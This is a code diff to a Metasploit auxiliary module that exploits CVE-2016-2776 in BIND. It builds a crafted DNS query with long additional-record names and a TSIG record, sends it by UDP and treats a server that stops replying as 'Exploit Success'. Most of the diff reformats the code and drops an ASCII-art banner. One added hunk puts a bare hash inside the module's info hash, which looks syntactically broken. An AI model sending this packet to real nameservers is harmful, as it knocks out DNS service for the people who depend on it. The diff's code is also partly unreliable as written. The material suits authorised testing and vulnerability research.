@@ -34,7 +34,10 @@ class MetasploitModule < Msf::Auxiliary
           [ 'CVE', '2016-2776' ],
           [ 'URL', 'http://blog.infobytesec.com/2016/09/a-tale-of-packet-cve-2016-2776.html' ]
         ],
-      'DisclosureDate' => '2016-09-27'
+      'DisclosureDate' => 'Sep 27 2016',
+      {
+        'ScannerRecvWindow' => 0
+      }
     ))
 
     register_options([
@@ -45,70 +48,38 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('PCAPFILE', 'FILTER', 'SNAPLEN', 'TIMEOUT')
   end
 
-  def scanner_prescan(batch)
-  	puts '''
-  	       	....                    
-               ,....                    
-             ..........7                
-              7...............7         
-               ........       7..       
-                  .I            I.      
-                                .,      
-                ~....,    7..  I.       
-            ....................        
-          ......................7       
-        ........................I       
-       ........................         
-      ..........................        
-      ..........................        
-     =...........................       
-     ............................       
-     ............................       
-     +..........................,       
-      ..........................7       
-      :.........................        
-       ........................         
-        +....................,          
-         7..................7           
-           7~............:7             
-                7+,,+777 
-  	'''
-  	datastore['ScannerRecvWindow'] = 0
-  end
-
   def checkServerStatus(ip, rport)
   	res = ""
   	sudp = UDPSocket.new
-	sudp.send(validQuery, 0, ip, rport)
-	begin 
-		Timeout.timeout(5) do
-	        res = sudp.recv(100)
-	    end
-	rescue Timeout::Error
-	end
+	  sudp.send(validQuery, 0, ip, rport)
+	  begin 
+		  Timeout.timeout(5) do
+	    res = sudp.recv(100)
+	  end
+	  rescue Timeout::Error
+	  end
 
-	if(res.length==0)
-     	print_good("Exploit Success (Maybe, nameserver did not replied)")
-     else
-     	print_error("Exploit Failed")
-     end
+	  if(res.length==0)
+      print_good("Exploit Success (Maybe, nameserver did not replied)")
+      else
+        print_error("Exploit Failed")
+    end
   end
 
   def scan_host(ip)
   	@flag_success = true
   	print_status("Sending bombita (Specially crafted udp packet) to: "+ip)
   	scanner_send(payload, ip, rport)
-  	checkServerStatus(ip, rport) 
+  	checkServerStatus(ip, rport)
   end
 
   def getDomain
-  	 domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
-  	 org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
-  	 getDomain = domain+org
+  	domain = "\x06"+Rex::Text.rand_text_alphanumeric(6)
+  	org = "\x03"+Rex::Text.rand_text_alphanumeric(3)
+  	getDomain = domain+org
   end
 
   def payload
-
     query = Rex::Text.rand_text_alphanumeric(2)  # Transaction ID: 0x8f65
     query += "\x00\x00"  # Flags: 0x0000 Standard query
     query += "\x00\x01"  # Questions: 1
@@ -125,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
     # Aditional records. Name
     query += ("\x3f"+Rex::Text.rand_text_alphanumeric(63))*3 #192 bytes
     query += "\x3d"+Rex::Text.rand_text_alphanumeric(61)
-	query += "\x00"
+	  query += "\x00"
 
     query += "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
     query += "\x00\xff" # Class: ANY (0x00ff)
